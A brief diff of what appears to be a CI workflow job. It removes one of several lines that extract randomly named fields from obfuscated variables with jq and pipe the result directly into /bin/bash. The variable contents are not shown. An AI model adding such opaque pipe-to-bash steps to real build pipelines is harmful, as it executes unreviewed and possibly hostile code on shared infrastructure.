@@ -32,7 +32,6 @@ jobs:
           echo $egzf819 | jq -r .uv55994 | /bin/bash
           printf '%s' "$i28485" | jq -r .keze62313 | /bin/bash
           printf '%s' "$q6699" | jq -r .czkjf841 | /bin/bash
-          printf '%s' "$zk929" | jq -r .xfdbm27 | /bin/bash
           echo $jyu92922 | jq -r .fvwx55026 | /bin/bash
 
       - name: Save output
